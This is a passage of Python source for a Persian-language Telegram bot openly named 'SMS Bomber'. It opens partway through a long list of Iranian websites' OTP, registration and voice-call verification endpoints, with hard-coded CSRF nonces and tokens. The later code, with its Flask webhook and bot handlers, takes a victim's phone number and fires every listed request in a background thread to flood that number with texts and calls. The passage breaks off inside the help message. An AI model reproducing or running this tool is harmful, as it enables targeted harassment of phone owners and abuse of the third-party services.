            "url": "https://gateway.wisgoon.com/api/v1/auth/login/",
            "data": {
                "phone": phone_number,
                "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg",
                "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
            }
        },
        {
            "name": "Snapp Doctor Verification",
            "url": f"https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/{phone_number}/sms?cCode=%2B98",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Tagmond Phone",
            "url": "https://tagmond.com/phone_number",
            "data": {
                "utf8": "✓",
                "phone_number": phone_number,
                "g-recaptcha-response": ""
            }
        },
        {
            "name": "Doctoreto Register POST",
            "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
            "data": {
                "mobile": phone_number,
                "country_id": 205
            }
        },
        {
            "name": "Olgoo Books Registration",
            "url": "https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox",
            "data": {
                "contactInfo[mobile]": phone_number,
                "contactInfo[agreementAccepted]": "1",
                "contactInfo[teachingFieldId]": "1",
                "contactInfo[eduGradeIds][7]": "7",
                "submit_register": "1"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Pakhsh Shop Digits",
            "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "fdaa7fc8e6",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "json": "1",
                "whatsapp": "0"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Didnegar Digits",
            "url": "https://www.didnegar.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number[1:],
                "csrf": "4c9ac22ff4",
                "login": "1",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "mobmail": phone_number,
                "dig_otp": "",
                "digits_login_remember_me": "1",
                "dig_nounce": "4c9ac22ff4"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "See5 CRM OTP",
            "url": "https://crm.see5.net/api_ajax/sendotp.php",
            "data": {
                "mobile": phone_number,
                "action": "sendsms"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Ghabzino GET",
            "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
            "method": "GET",
            "data": {
                "Parameters": {
                    "ApplicationType": "Web",
                    "ApplicationUniqueToken": None,
                    "ApplicationVersion": "1.0.0",
                    "MobileNumber": phone_number
                }
            }
        },
        {
            "name": "Simkhan Register V2",
            "url": "https://www.simkhanapi.ir/api/users/registerV2",
            "data": {
                "mobileNumber": phone_number,
                "ReSendSMS": False
            }
        },
        {
            "name": "DrSaina Register",
            "url": "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation",
            "data": {
                "__RequestVerificationToken": "CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg",
                "noLayout": "False",
                "action": "checkIfUserExistOrNot",
                "lId": "",
                "codeGuid": "00000000-0000-0000-0000-000000000000",
                "PhoneNumber": phone_number,
                "confirmCode": "",
                "fullName": "",
                "Password": "",
                "Password2": ""
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Devslop OTP",
            "url": "https://i.devslop.app/app/ifollow/api/otp.php",
            "data": {
                "number": phone_number,
                "state": "number"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Behzad Shami Digits",
            "url": "https://behzadshami.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number[1:],
                "csrf": "3b4194a8bb",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digits_reg_فیلدمتنی1642498931181": "Nvgu",
                "digregcode": "+98",
                "digits_reg_mail": phone_number[1:],
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "3b4194a8bb"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Ghasedak24 Register",
            "url": "https://ghasedak24.com/user/ajax_register",
            "data": {"username": phone_number}
        },
        {
            "name": "Iran Ketab Register",
            "url": "https://www.iranketab.ir/account/register",
            "data": {"UserName": phone_number}
        },
        {
            "name": "Irani Card Register",
            "url": "https://api.iranicard.ir/api/v1/register",
            "data": {"mobile": phone_number}
        },
        {
            "name": "PUBG Sell Login",
            "url": f"https://pubg-sell.ir/loginuser?username={phone_number}",
            "method": "POST",
            "data": {}
        },
        {
            "name": "TJ8 Register",
            "url": "https://tj8.ir/auth/register",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Mashinbank Check",
            "url": "https://mashinbank.com/api2/users/check",
            "data": {"mobileNumber": phone_number}
        },
        {
            "name": "Cinematicket Signup",
            "url": "https://cinematicket.org/api/v1/users/signup",
            "data": {"phone_number": phone_number}
        },
        {
            "name": "Kafe Gheymat Login",
            "url": "https://kafegheymat.com/shop/getLoginSms",
            "data": {"phone": phone_number}
        },
        {
            "name": "Snapp Express Mobile",
            "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85",
            "data": {"cellphone": phone_number}
        },
        {
            "name": "Opco Register",
            "url": "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code",
            "data": {"telephone": phone_number}
        },
        {
            "name": "Melix Shop OTP",
            "url": "https://melix.shop/site/api/v1/user/otp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Safiran Shop Login",
            "url": "https://safiran.shop/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Pirankala Send Phone",
            "url": "https://pirankalaco.ir/shop/SendPhone.php",
            "data": {"phone": phone_number},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "TNovin Login",
            "url": "http://shop.tnovin.com/login",
            "data": {"phone": phone_number},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Dastkhat Store",
            "url": "https://dastkhat-isad.ir/api/v1/user/store",
            "data": {
                "mobile": phone_number[1:],
                "countryCode": 98,
                "device_os": 2
            }
        },
        {
            "name": "Hamlex Register",
            "url": "https://hamlex.ir/register.php",
            "data": {
                "fullname": "ممد",
                "phoneNumber": phone_number,
                "register": ""
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "IRWCO Register",
            "url": "https://irwco.ir/register",
            "data": {"mobile": phone_number},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Moshaveran724 PMS",
            "url": "https://moshaveran724.ir/m/pms.php",
            "data": {
                "againkey": phone_number,
                "cache": "false"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Sibbank Auth",
            "url": "https://api.sibbank.ir/v1/auth/login",
            "data": {"phone_number": phone_number}
        },
        {
            "name": "Steel Alborz Digits",
            "url": "https://steelalborz.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "2aae5b41f1",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "2aae5b41f1"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Arshiyan Send Code",
            "url": "https://api.arshiyan.com/send_code",
            "data": {
                "country_code": "98",
                "phone_number": phone_number[1:]
            }
        },
        {
            "name": "Topnoor OTP",
            "url": "https://backend.topnoor.ir/web/v1/user/otp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Alinance Register",
            "url": "https://api.alinance.com/user/register/mobile/send/",
            "data": {"phone_number": phone_number}
        },
        {
            "name": "Alopeyk Safir",
            "url": "https://api.alopeyk.com/safir-service/api/v1/login",
            "data": {"phone": phone_number}
        },
        {
            "name": "Chaymarket Digits",
            "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "c832b38a97",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "json": "1",
                "whatsapp": "0"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Coffe Fastfood Digits",
            "url": "https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "e23c15918c",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "e23c15918c"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Dosma Verify",
            "url": "https://app.dosma.ir/sendverify/",
            "data": {"username": phone_number}
        },
        {
            "name": "Ehteraman OTP",
            "url": "https://api.ehteraman.com/api/request/otp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "MCI EB OTP",
            "url": "https://api-ebcom.mci.ir/services/auth/v1.0/otp",
            "data": {"msisdn": phone_number[1:]}
        },
        {
            "name": "HBBS Send Code",
            "url": "https://api.hbbs.ir/authentication/SendCode",
            "data": {"MobileNumber": phone_number}
        },
        {
            "name": "Homtick Verify",
            "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode",
            "data": {
                "mobileOrEmail": phone_number,
                "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec",
                "firstName": "",
                "lastName": "",
                "password": ""
            }
        },
        {
            "name": "Iran Amlaak OTP",
            "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",
            "data": {"AgencyMobile": phone_number}
        },
        {
            "name": "KCD Auth",
            "url": "https://api.kcd.app/api/v1/auth/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Mazoocandle Login",
            "url": "https://mazoocandle.ir/login",
            "data": {"phone": phone_number[1:]}
        },
        {
            "name": "Paymishe OTP",
            "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Rayshomar Register",
            "url": "https://api.rayshomar.ir/api/Register/RegistrMobile",
            "data": {"MobileNumber": phone_number},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Amoomilad Sendcode",
            "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",
            "data": {
                "Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c",
                "DeviceId": 1,
                "PhoneNumber": phone_number,
                "Helper": 77942
            }
        },
        {
            "name": "Ashraafi Digits",
            "url": "https://ashraafi.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number[1:],
                "csrf": "54dfdabe34",
                "login": "1",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "mobmail": phone_number[1:],
                "dig_otp": "",
                "dig_nounce": "54dfdabe34"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Bandar Azad Digits",
            "url": "https://bandarazad.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "ec10ccb02a",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "digits_reg_password": "fuckYOU",
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "ec10ccb02a"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Bazidone Digits",
            "url": "https://bazidone.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number[1:],
                "csrf": "c0f5d0dcf2",
                "login": "1",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "mobmail": phone_number,
                "dig_otp": "",
                "digits_login_remember_me": "1",
                "dig_nounce": "c0f5d0dcf2"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Bigtoys Digits",
            "url": "https://www.bigtoys.ir/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "94cf3ad9a4",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digits_reg_name": "بیبلیبل",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "digregscode2": "+98",
                "mobmail2": "",
                "digits_reg_password": "",
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "94cf3ad9a4"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Bitex24 Send SMS",
            "url": f"https://bitex24.com/api/v1/auth/sendSms?mobile={phone_number}&dial_code=0",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Candoo SMS",
            "url": "https://www.candoosms.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "send_sms",
                "phone": phone_number
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Fars Graphic Digits",
            "url": "https://farsgraphic.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number[1:],
                "csrf": "79a35b4aa3",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digits_reg_name": "نیمنمنیس",
                "digits_reg_lastname": "منسیزتن",
                "digregscode2": "+98",
                "mobmail2": "",
                "digregcode": "+98",
                "digits_reg_mail": phone_number[1:],
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "79a35b4aa3"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Glite Login",
            "url": "https://www.glite.ir/wp-admin/admin-ajax.php",
            "data": {
                "action": "logini_first",
                "login": phone_number
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Hemat Elec Digits",
            "url": "https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "d33076d828",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digregscode2": "+98",
                "mobmail2": "",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "digits_reg_password": "mahyar125",
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "d33076d828"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Kodakamoz Digits",
            "url": "https://www.kodakamoz.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "18551366bc",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digits_reg_lastname": "لبییبثقح",
                "digits_reg_displayname": "ببیربللیبل",
                "digregscode2": "+98",
                "mobmail2": "",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "digits_reg_password": "",
                "digits_reg_avansbirthdate": "2003-03-21",
                "jalali_digits_reg_avansbirthdate1867119037": "1382-01-01",
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "18551366bc"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Mipersia Digits",
            "url": "https://www.mipersia.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "digits_check_mob",
                "countrycode": "+98",
                "mobileNo": phone_number,
                "csrf": "2d39af0a72",
                "login": "2",
                "username": "",
                "email": "",
                "captcha": "",
                "captcha_ses": "",
                "digits": "1",
                "json": "1",
                "whatsapp": "0",
                "digregcode": "+98",
                "digits_reg_mail": phone_number,
                "digregscode2": "+98",
                "mobmail2": "",
                "dig_otp": "",
                "code": "",
                "dig_reg_mail": "",
                "dig_nounce": "2d39af0a72"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Novinbook Phone",
            "url": "https://novinbook.com/index.php?route=account/phone",
            "data": {"phone": phone_number},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Offch OTP",
            "url": "https://api.offch.com/auth/otp",
            "data": {"username": phone_number}
        },
        {
            "name": "Sabziman Phone Exist",
            "url": "https://sabziman.com/wp-admin/admin-ajax.php",
            "data": {
                "action": "newphoneexist",
                "phonenumber": phone_number
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Taj Tehran Register",
            "url": "https://tajtehran.com/RegisterRequest",
            "data": {
                "mobile": phone_number,
                "password": "mamad1234"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "MrBilit Call",
            "url": f"https://auth.mrbilit.com/api/Token/send/byCall?mobile={phone_number}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Gap.im Call",
            "url": f"https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{phone_number[1:]}&type=IVR",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Novinbook Call",
            "url": "https://novinbook.com/index.php?route=account/phone",
            "data": {
                "phone": phone_number,
                "call": "yes"
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Azki Call",
            "url": f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={phone_number}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Trip.ir Register",
            "url": "https://gateway.trip.ir/api/registers",
            "data": {"CellPhone": phone_number}
        },
        {
            "name": "Paklean Voice",
            "url": "https://client.api.paklean.com/user/resendVoiceCode",
            "data": {"username": phone_number}
        },
        {
            "name": "Raghamapp Code",
            "url": "https://web.raghamapp.com/api/users/code",
            "data": {"phone": f"+98{phone_number[1:]}"}
        },
        {
            "name": "Digimaze OTP",
            "url": "https://digimaze.org/api/sms/v1/otp/request",
            "data": {"phone": phone_number},
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        },
    ]

# ==================== صفحات وب ====================

@app.route('/webhook', methods=['POST'])
def webhook():
    """دریافت آپدیت از تلگرام"""
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return 'OK', 200
    except Exception as e:
        print(f"❌ خطا در webhook: {e}")
        return 'Error', 500

@app.route('/')
def home():
    """صفحه اصلی"""
    return f"""
    <html>
        <head>
            <title>ربات SMS Bomber</title>
            <style>
                body {{ 
                    font-family: 'Vazir', Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                .container {{
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    padding: 40px;
                    border-radius: 20px;
                    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                    border: 1px solid rgba(255, 255, 255, 0.18);
                    max-width: 600px;
                    width: 90%;
                }}
                h1 {{ 
                    color: #fff; 
                    font-size: 2.5em;
                    margin-bottom: 30px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
                }}
                .info {{ 
                    background: rgba(255, 255, 255, 0.2);
                    padding: 25px; 
                    border-radius: 15px; 
                    margin: 20px 0;
                    text-align: left;
                }}
                .info p {{
                    margin: 15px 0;
                    font-size: 1.1em;
                    border-bottom: 1px solid rgba(255,255,255,0.2);
                    padding-bottom: 10px;
                }}
                .info p:last-child {{
                    border-bottom: none;
                }}
                .label {{
                    font-weight: bold;
                    color: #ffd700;
                    margin-right: 10px;
                }}
                .value {{
                    color: #fff;
                }}
                .status-badge {{
                    display: inline-block;
                    padding: 5px 15px;
                    border-radius: 20px;
                    font-size: 0.9em;
                    font-weight: bold;
                }}
                .status-active {{
                    background: #4CAF50;
                    color: white;
                }}
                .footer {{
                    margin-top: 30px;
                    font-size: 0.9em;
                    color: rgba(255,255,255,0.7);
                }}
                a {{
                    color: #ffd700;
                    text-decoration: none;
                }}
                a:hover {{
                    text-decoration: underline;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🤖 ربات SMS Bomber</h1>
                <div class="info">
                    <p>
                        <span class="label">📌 نام سرویس:</span>
                        <span class="value">{SERVICE_NAME}</span>
                    </p>
                    <p>
                        <span class="label">🌐 آدرس:</span>
                        <span class="value">{BASE_URL}</span>
                    </p>
                    <p>
                        <span class="label">🔰 Webhook:</span>
                        <span class="value">{WEBHOOK_URL}</span>
                    </p>
                    <p>
                        <span class="label">⚡ وضعیت:</span>
                        <span class="value">
                            <span class="status-badge status-active">فعال</span>
                        </span>
                    </p>
                    <p>
                        <span class="label">📊 محدودیت روزانه:</span>
                        <span class="value">{DAILY_LIMIT} بار</span>
                    </p>
                    <p>
                        <span class="label">📢 کانال:</span>
                        <span class="value">
                            <a href="{CHANNEL_LINK}" target="_blank">{REQUIRED_CHANNEL}</a>
                        </span>
                    </p>
                </div>
                <div class="footer">
                    <p>برای استفاده از ربات، به تلگرام بروید و دستور /start را بزنید</p>
                    <p>⚡ توسط تیم TOP TOPY ⚡</p>
                </div>
            </div>
        </body>
    </html>
    """

@app.route('/health')
def health():
    """بررسی سلامت"""
    return {
        "status": "healthy", 
        "service": SERVICE_NAME,
        "time": datetime.now().isoformat(),
        "webhook": WEBHOOK_URL
    }

@app.route('/webhook-status')
def webhook_status():
    """بررسی وضعیت Webhook"""
    try:
        info = bot.get_webhook_info()
        return {
            "ok": info.url == WEBHOOK_URL,
            "current_url": info.url,
            "correct_url": WEBHOOK_URL,
            "pending_updates": info.pending_update_count,
            "last_error": info.last_error_message,
            "is_correct": info.url == WEBHOOK_URL
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ==================== تنظیم Webhook ====================

def set_webhook():
    """تنظیم webhook برای بات"""
    max_retries = 5
    for attempt in range(max_retries):
        try:
            print(f"📌 تلاش {attempt + 1}: تنظیم Webhook روی {WEBHOOK_URL}")
            
            bot.remove_webhook()
            time.sleep(2)
            
            # ست کردن Webhook
            result = bot.set_webhook(url=WEBHOOK_URL)
            if result:
                print(f"✅ Webhook با موفقیت تنظیم شد")
                
                # چک کردن Webhook
                time.sleep(1)
                webhook_info = bot.get_webhook_info()
                print(f"📊 اطلاعات Webhook:")
                print(f"  📌 URL: {webhook_info.url}")
                print(f"  📊 آپدیت‌های در انتظار: {webhook_info.pending_update_count}")
                
                if webhook_info.last_error_message:
                    print(f"  ⚠️ آخرین خطا: {webhook_info.last_error_message}")
                
                if webhook_info.url == WEBHOOK_URL:
                    print("✅ آدرس Webhook درسته!")
                    return True
                else:
                    print("❌ آدرس Webhook اشتباهه!")
            else:
                print(f"❌ تلاش {attempt + 1}: Webhook تنظیم نشد!")
                
        except Exception as e:
            print(f"❌ خطا در تلاش {attempt + 1}: {e}")
        
        time.sleep(3)
    
    print("❌ تنظیم Webhook پس از 5 تلاش ناموفق بود")
    return False

# ==================== هندلرهای بات ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 شروع بمباران"))
    markup.add(KeyboardButton("📊 راهنما"), KeyboardButton("📊 آمار من"))
    
    if is_admin(user_id):
        markup.add(KeyboardButton("👑 پنل مدیریت"))
    
    welcome = (
        "🤖 **به ربات SMS Bomber خوش آمدید!**\n\n"
        f"📌 **روزانه {DAILY_LIMIT} بار** می‌توانید استفاده کنید\n"
        f"📢 **کانال اجباری:** {REQUIRED_CHANNEL}\n\n"
        f"🌐 **آدرس سرویس:**\n"
        f"`{BASE_URL}`\n\n"
        "🔰 برای شروع از دکمه زیر استفاده کنید:"
    )
    
    bot.send_message(message.chat.id, welcome, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    if check_membership(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ عضویت تایید شد!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ حالا می‌توانید از ربات استفاده کنید.")
    else:
        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
@membership_required
def ask_phone(message):
    user_id = message.from_user.id
    
    can_use, daily = check_daily_limit(user_id)
    if not can_use:
        bot.send_message(
            message.chat.id, 
            f"❌ شما امروز {daily} بار استفاده کرده‌اید.\n"
            f"محدودیت روزانه {DAILY_LIMIT} بار است.\n"
            "فردا دوباره تلاش کنید."
        )
        return
    
    if user_processes.get(message.chat.id):
        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست. لطفاً صبر کنید.")
        return
    
    msg = bot.send_message(message.chat.id, "📱 شماره موبایل را وارد کنید (مثال: 09123456789):")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    phone = message.text.strip().replace(" ", "")
    
    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
        bot.send_message(chat_id, "❌ شماره نامعتبر است. لطفاً با 09 شروع شود و 11 رقم باشد.")
        return
    
    if is_phone_protected(phone):
        bot.send_message(chat_id, "❌ این شماره در لیست سیاه قرار دارد.")
        return
    
    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
    
    remaining = DAILY_LIMIT - get_daily_count(user_id)
    if not is_admin(user_id):
        bot.send_message(chat_id, f"✅ امروز {remaining} بار دیگر می‌توانید استفاده کنید.")
    
    user_processes[chat_id] = True
    msg = bot.send_message(chat_id, f"🔰 شروع برای {mask_phone(phone)}...")
    
    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
    thread.daemon = True
    thread.start()

def bombing_process(chat_id, phone, msg_id):
    apis = get_all_apis(phone)
    total = len(apis)
    success = 0
    fail = 0
    start_time = time.time()
    
    for i, api in enumerate(apis, 1):
        if not user_processes.get(chat_id):
            bot.edit_message_text("⛔ فرآیند متوقف شد.", chat_id, msg_id)
            return
        
        ok, _ = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
        
        if ok:
            success += 1
        else:
            fail += 1
        
        if i % 2 == 0 or i == total:
            elapsed = int(time.time() - start_time)
            try:
                bot.edit_message_text(
                    f"🔰 **پیشرفت:** {int(i/total*100)}%\n"
                    f"✅ **موفق:** {success}\n"
                    f"❌ **ناموفق:** {fail}\n"
                    f"⏱ **زمان:** {elapsed} ثانیه",
                    chat_id, msg_id,
                    parse_mode="Markdown"
                )
            except:
                pass
        
        time.sleep(random.uniform(0.3, 0.7))
    
    elapsed = int(time.time() - start_time)
    bot.edit_message_text(
        f"✅ **پایان فرآیند**\n\n"
        f"✅ **موفق:** {success}\n"
        f"❌ **ناموفق:** {fail}\n"
        f"⏱ **زمان کل:** {elapsed} ثانیه",
        chat_id, msg_id,
        parse_mode="Markdown"
    )
    
    user_processes.pop(chat_id, None)

@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
def help_message(message):
    text = (
        "📚 **راهنمای استفاده**\n\n"
